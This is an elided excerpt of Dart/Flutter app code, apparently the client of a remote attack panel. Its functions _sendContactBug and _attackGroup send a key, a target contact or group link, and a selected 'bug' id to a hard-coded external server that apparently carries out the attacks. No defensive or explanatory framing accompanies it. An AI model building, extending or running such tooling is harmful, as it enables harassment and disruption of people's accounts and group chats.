...
void didChangeDependencies() {
  ...
  try {
    final response = await http.get(
      Uri.parse(
        "http://yaanzsuika.pterodactyl.biz.id:3632/refreshCoins?"
  ...
  Future<void> _sendContactBug() async {
    ...
    .get(
      Uri.parse(
        "http://yaanzsuika.pterodactyl.biz.id:3632/$endpoint?key=$key&target=$target&bug=$selectedBugId",
      ),
    )
    .timeout(
  ...
  Future<void> _attackGroup() async {
    ...
    try {
      ...
      final response = await http.get(
        Uri.parse(
          "http://yaanzsuika.pterodactyl.biz.id:3632/$endpoint?key=$key&link=$groupLink"
        ),
      ).timeout(
